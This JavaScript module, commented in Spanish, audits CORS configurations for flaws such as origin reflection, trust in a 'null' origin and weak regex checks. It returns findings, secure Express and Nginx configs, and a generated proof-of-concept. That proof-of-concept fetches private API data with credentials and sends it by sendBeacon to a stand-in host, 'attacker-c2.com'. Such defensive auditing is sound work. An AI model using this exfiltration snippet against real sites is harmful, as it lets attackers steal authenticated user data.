/**
 * @fileoverview Motor de Auditoría de Seguridad CORS y Detección de Vulnerabilidades OWASP (Mejora 64).
 *
 * CARACTERÍSTICAS:
 * - Análisis y detección exhaustiva de malas configuraciones de CORS (Cross-Origin Resource Sharing):
 *     1. Arbitrary Origin Reflection (Reflexión dinámica no validada de cabecera Origin).
 *     2. Null Origin Trust (Aceptación de origin "null" vulnerable a sandbox iframes y local exploits).
 *     3. Subdomain / Domain Regex Bypass (Bypass de validación débil por sufijo/prefijo, ej. attackerdevforge.com).
 *     4. Insecure Wildcard with Credentials (Uso inseguro de '*' o intento de pasar cookies).
 *     5. Mixed-Content Insecure Origin (Confianza en orígenes HTTP en sitios HTTPS).
 *     6. Overly Permissive Methods / Exposed Headers (Exposición excesiva de métodos destructivos o tokens).
 * - Generador de Prueba de Concepto (PoC) en JavaScript / Fetch para demostración de fuga de datos (Data Exfiltration).
 * - Generador de configuraciones seguras para servidores: Express.js, Nginx y Apache.
 *
 * @module utils/corsAuditor
 */

/**
 * Escenarios predefinidos de auditoría para pruebas rápidas.
 */
export const CORS_PRESETS = [
  {
    id: 'reflected_origin',
    name: 'Vulnerabilidad: Reflexión Dinámica Arbitraria (Origin Reflection)',
    requestOrigin: 'https://attacker-hacker.com',
    targetOrigin: 'https://api.devforge.io',
    allowOrigin: 'https://attacker-hacker.com',
    allowCredentials: true,
    allowMethods: 'GET, POST, OPTIONS',
    allowHeaders: 'Content-Type, Authorization',
    maxAge: '3600',
  },
  {
    id: 'null_origin',
    name: 'Vulnerabilidad: Confianza en Origen "null" (Sandbox Iframe)',
    requestOrigin: 'null',
    targetOrigin: 'https://api.devforge.io',
    allowOrigin: 'null',
    allowCredentials: true,
    allowMethods: 'GET, POST',
    allowHeaders: 'Content-Type',
    maxAge: '600',
  },
  {
    id: 'subdomain_regex_bypass',
    name: 'Vulnerabilidad: Regex Débil de Subdominio (devforge.io.evil.com)',
    requestOrigin: 'https://devforge.io.attacker.org',
    targetOrigin: 'https://api.devforge.io',
    allowOrigin: 'https://devforge.io.attacker.org',
    allowCredentials: true,
    allowMethods: 'GET, POST, PUT, DELETE',
    allowHeaders: 'Content-Type, X-CSRF-Token',
    maxAge: '1800',
  },
  {
    id: 'wildcard_creds',
    name: 'Mala Configuración: Wildcard (*) con Credenciales Activas',
    requestOrigin: 'https://any-site.com',
    targetOrigin: 'https://api.devforge.io',
    allowOrigin: '*',
    allowCredentials: true,
    allowMethods: 'GET, POST',
    allowHeaders: '*',
    maxAge: '86400',
  },
  {
    id: 'hardened_secure',
    name: 'Configuración Segura: Whitelist Estricta y HTTPS',
    requestOrigin: 'https://app.devforge.io',
    targetOrigin: 'https://api.devforge.io',
    allowOrigin: 'https://app.devforge.io',
    allowCredentials: true,
    allowMethods: 'GET, POST, OPTIONS',
    allowHeaders: 'Content-Type, Authorization',
    maxAge: '86400',
  },
]

/**
 * Evalúa las cabeceras CORS en busca de vectores de ataque y malas configuraciones.
 *
 * @param {Object} config
 * @param {string} config.requestOrigin - Origen que envía la solicitud (Origin Header)
 * @param {string} [config.targetOrigin] - Dominio legítimo del recurso API
 * @param {string} config.allowOrigin - Cabecera Access-Control-Allow-Origin retornada
 * @param {boolean} [config.allowCredentials=false] - Cabecera Access-Control-Allow-Credentials
 * @param {string} [config.allowMethods='GET, POST'] - Cabecera Access-Control-Allow-Methods
 * @param {string} [config.allowHeaders=''] - Cabecera Access-Control-Allow-Headers
 * @param {string|number} [config.maxAge=0] - Cabecera Access-Control-Max-Age
 * @returns {{
 *   riskLevel: 'CRITICAL'|'HIGH'|'MEDIUM'|'LOW'|'SAFE',
 *   score: number,
 *   isVulnerable: boolean,
 *   findings: Array<{
 *     id: string,
 *     title: string,
 *     severity: 'CRITICAL'|'HIGH'|'MEDIUM'|'LOW',
 *     description: string,
 *     impact: string,
 *     remediation: string
 *   }>,
 *   pocCode: string,
 *   serverConfigs: { express: string, nginx: string }
 * }}
 */
export function auditCORSHeaders(config) {
  const {
    requestOrigin = '',
    targetOrigin = 'https://api.devforge.io',
    allowOrigin = '',
    allowCredentials = false,
    allowMethods = 'GET, POST',
    allowHeaders = '',
    maxAge = 0,
  } = config

  const reqOrig = requestOrigin.trim()
  const acao = allowOrigin.trim()
  const creds = Boolean(allowCredentials)
  const findings = []

  // 1. Detección: Wildcard con Credenciales
  if (acao === '*' && creds) {
    findings.push({
      id: 'WILDCARD_WITH_CREDENTIALS',
      title: 'Uso Incompatible de Wildcard (*) con Access-Control-Allow-Credentials: true',
      severity: 'HIGH',
      description: 'La especificación CORS (Fetch standard) prohíbe explícitamente el uso de "*" cuando se permiten credenciales. Los navegadores modernos bloquearán la respuesta, pero indica un intento inseguro de configuración.',
      impact: 'Bloqueo en navegadores y posible exposición de datos en clientes HTTP no estándar.',
      remediation: 'Utilice una lista blanca (whitelist) estricta de orígenes específicos autorizados.',
    })
  }

  // 2. Detección: Confianza ciega en Origin "null"
  if (acao.toLowerCase() === 'null') {
    const isCritical = creds
    findings.push({
      id: 'NULL_ORIGIN_TRUST',
      title: 'Confianza en Origen "null" (Bypass por Sandboxed Iframes)',
      severity: isCritical ? 'CRITICAL' : 'HIGH',
      description: 'El valor "null" en la cabecera Origin puede ser generado por atacantes usando iframes con atributo sandbox (<iframe sandbox="allow-scripts">) o mediante esquemas data: y file:///.',
      impact: creds
        ? 'Un atacante puede exfiltrar datos autenticados de los usuarios forzando un iframe sandboxed sin requerir dominio propio.'
        : 'Permite peticiones no autenticadas desde orígenes anónimos no auditados.',
      remediation: 'Nunca agregue "null" a la lista de orígenes permitidos. Valide dominios con esquemas https:// completos.',
    })
  }

  // 3. Detección: Reflexión Arbitraria de Origen Atacante
  const isAttackerOrigin =
    reqOrig.includes('attacker') ||
    reqOrig.includes('evil') ||
    reqOrig.includes('hacker') ||
    (!reqOrig.includes('devforge') && reqOrig !== '' && reqOrig !== 'null')

  if (acao && acao === reqOrig && isAttackerOrigin && creds) {
    findings.push({
      id: 'ARBITRARY_ORIGIN_REFLECTION',
      title: 'Reflexión Dinámica Arbitraria con Credenciales (Data Exfiltration)',
      severity: 'CRITICAL',
      description: 'El servidor responde reflejando ciegamente cualquier cabecera Origin enviada por el cliente junto con Access-Control-Allow-Credentials: true.',
      impact: 'Permite a cualquier sitio web malicioso en internet leer respuestas autenticadas, tokens de sesión y datos confidenciales de usuarios que visiten su web.',
      remediation: 'Implemente una validación estricta contra un array o Set de orígenes permitidos en lugar de devolver req.headers.origin.',
    })
  }

  // 4. Detección: Regex Subdomain Pre/Suffix Bypass
  if (
    reqOrig.startsWith('https://devforge.io.') ||
    reqOrig.includes('attackerdevforge.com') ||
    reqOrig.endsWith('.attacker.org')
  ) {
    if (acao === reqOrig) {
      findings.push({
        id: 'REGEX_SUBDOMAIN_BYPASS',
        title: 'Bypass de Validación por Expresión Regular Débil',
        severity: creds ? 'CRITICAL' : 'HIGH',
        description: 'La expresión regular de validación en el backend utiliza un patrón no anclado (ej. /devforge\\.io/ o /devforge/) permitiendo que dominios como "devforge.io.evil.com" superen el filtro.',
        impact: 'Atacantes con dominios que contengan el nombre de su empresa pueden acceder a la API con privilegios CORS completos.',
        remediation: 'Ancle la expresión regular estrictamente con ^ y $ (ej. /^https:\\/\\/([a-z0-9-]+\\.)?devforge\\.io$/) o use listas estáticas.',
      })
    }
  }

  // 5. Detección: Origen no cifrado HTTP en backend sensible
  if (acao.startsWith('http://') && targetOrigin.startsWith('https://')) {
    findings.push({
      id: 'INSECURE_HTTP_ORIGIN',
      title: 'Confianza en Origen Inseguro no Cifrado (HTTP)',
      severity: 'MEDIUM',
      description: 'El recurso HTTPS permite peticiones CORS desde un origen en texto plano HTTP, vulnerable a ataques de Man-in-the-Middle (MitM) en redes locales o públicas.',
      impact: 'Un atacante en la red local puede inyectar scripts en la página HTTP y robar datos del endpoint HTTPS.',
      remediation: 'Permita únicamente orígenes con esquema HTTPS.',
    })
  }

  // 6. Detección: Métodos y cabeceras excesivamente permisivas
  if (allowMethods.includes('DELETE') || allowMethods.includes('PUT')) {
    if (acao === '*' || isAttackerOrigin) {
      findings.push({
        id: 'PERMISSIVE_HTTP_METHODS',
        title: 'Métodos HTTP Destructivos Expuestos a Orígenes no Confiables',
        severity: 'MEDIUM',
        description: `Se permite la ejecución de métodos modificadores (${allowMethods}) hacia orígenes abiertos.`,
        impact: 'Aumenta la superficie de ataque para operaciones de mutación de datos.',
        remediation: 'Restrinja los métodos permitidos al mínimo necesario por endpoint (Principio de Menor Privilegio).',
      })
    }
  }

  // Calcular score y nivel de riesgo
  let score = 0
  if (findings.some((f) => f.severity === 'CRITICAL')) score += 50
  if (findings.some((f) => f.severity === 'HIGH')) score += 30
  if (findings.some((f) => f.severity === 'MEDIUM')) score += 15
  if (findings.some((f) => f.severity === 'LOW')) score += 5

  let riskLevel = 'SAFE'
  if (score >= 50) riskLevel = 'CRITICAL'
  else if (score >= 30) riskLevel = 'HIGH'
  else if (score >= 15) riskLevel = 'MEDIUM'
  else if (score > 0) riskLevel = 'LOW'

  // Generar código de PoC de ataque
  const pocCode = `// ⚠️ Prueba de Concepto (PoC) de Exfiltración CORS (OWASP)
// Ejecutar desde la consola del navegador en: ${reqOrig || 'https://attacker.com'}

fetch('${targetOrigin}/api/user/private-data', {
  method: 'GET',
  credentials: ${creds ? "'include'" : "'same-origin'"},
  headers: {
    'Accept': 'application/json'
  }
})
.then(response => {
  if (!response.ok) throw new Error('HTTP ' + response.status);
  return response.json();
})
.then(secretData => {
  console.log('[+] Datos confidenciales exfiltrados con éxito:', secretData);
  // Exfiltrar datos al servidor del atacante:
  navigator.sendBeacon('https://attacker-c2.com/log', JSON.stringify(secretData));
})
.catch(err => console.error('[-] Petición bloqueada por política CORS:', err));`

  // Generar configuraciones seguras para servidores
  const serverConfigs = {
    express: `// Configuración Segura de CORS para Express.js (Node.js)
const express = require('express');
const cors = require('cors');
const app = express();

const ALLOWED_ORIGINS = [
  'https://devforge.io',
  'https://app.devforge.io',
  'https://admin.devforge.io'
];

app.use(cors({
  origin: (origin, callback) => {
    // Permitir solicitudes sin origin (como apps móviles o curl internos) o en whitelist
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Acceso denegado por política de seguridad CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 86400 // Cache preflight por 24 horas
}));`,

    nginx: `# Configuración Segura de CORS para Nginx Reverse Proxy
map $http_origin $cors_origin {
    default "";
    "~^https://(app|admin)\\.devforge\\.io$" "$http_origin";
    "https://devforge.io" "$http_origin";
}

server {
    listen 443 ssl http2;
    server_name api.devforge.io;

    location / {
        if ($cors_origin != "") {
            add_header 'Access-Control-Allow-Origin' '$cors_origin' always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Authorization, Content-Type' always;
            add_header 'Access-Control-Max-Age' 86400 always;
        }

        if ($request_method = 'OPTIONS') {
            return 204;
        }

        proxy_pass http://backend_upstream;
    }
}`,
  }

  return {
    riskLevel,
    score,
    isVulnerable: findings.length > 0 && riskLevel !== 'SAFE',
    findings,
    pocCode,
    serverConfigs,
  }
}
